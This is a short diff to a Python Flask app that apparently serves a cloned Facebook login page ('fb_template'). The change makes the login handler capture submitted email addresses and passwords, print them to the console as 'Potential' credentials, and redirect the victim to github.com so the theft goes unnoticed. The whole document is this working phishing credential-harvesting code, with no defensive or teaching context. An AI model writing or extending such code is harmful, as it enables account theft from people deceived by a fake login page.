@@ -1,6 +1,6 @@
 
 # import the Flask class from the flask module
-from flask import Flask, render_template, request
+from flask import Flask, render_template, request, redirect
 import os
 from settings import *
 
@@ -19,8 +19,11 @@ def log_in():
     if request.method == "POST":
         # Attempt the login & do something else
         print("Post")
-        return render_template('fb_template/index.html')
-        
+        req = request.form
+        print("Potential Email Id/Username :"+req['email'])
+        print("Potential Password : "+req['pass'])
+        return redirect('https://github.com/')
+
     elif request.method == "GET":
         return render_template('fb_template/index.html')
 
